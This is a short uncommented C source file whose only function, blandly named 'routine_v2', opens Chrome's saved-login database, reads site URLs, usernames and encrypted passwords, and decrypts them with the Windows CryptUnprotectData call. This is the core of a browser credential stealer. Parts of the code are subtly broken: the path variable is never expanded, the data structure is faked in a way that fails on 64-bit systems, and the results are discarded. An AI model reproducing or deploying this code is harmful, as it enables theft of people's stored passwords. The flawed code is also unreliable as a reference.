#include <windows.h>
#include <wincrypt.h>

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
int sqlite3_open(const char *, sqlite3 **);
int sqlite3_prepare_v2(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
int sqlite3_step(sqlite3_stmt *);
int sqlite3_column_bytes(sqlite3_stmt *, int);
const void *sqlite3_column_blob(sqlite3_stmt *, int);
const unsigned char *sqlite3_column_text(sqlite3_stmt *, int);
int sqlite3_finalize(sqlite3_stmt *);
int sqlite3_close(sqlite3 *);

void __attribute__((noinline)) __attribute__((used)) routine_v2()
{
    char b[260];
    char *p = b;
    char *s = "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data";
    while (*s)
        *p++ = *s++;
    *p = 0;
    sqlite3 *d = 0;
    sqlite3_open(b, &d);
    sqlite3_stmt *q = 0;
    sqlite3_prepare_v2(d, "SELECT origin_url, username_value, password_value FROM logins", -1, &q, 0);
    while (sqlite3_step(q) == 100)
    {
        const unsigned char *u = sqlite3_column_text(q, 0);
        const unsigned char *n = sqlite3_column_text(q, 1);
        const void *l = sqlite3_column_blob(q, 2);
        int z = sqlite3_column_bytes(q, 2);
        BYTE f[8];
        *(DWORD *)f = (DWORD)z;
        *(BYTE **)(f + 4) = (BYTE *)l;
        DATA_BLOB o;
        CryptUnprotectData((DATA_BLOB *)f, 0, 0, 0, 0, 0, &o);
        LocalFree(o.pbData);
    }
    sqlite3_finalize(q);
    sqlite3_close(d);
}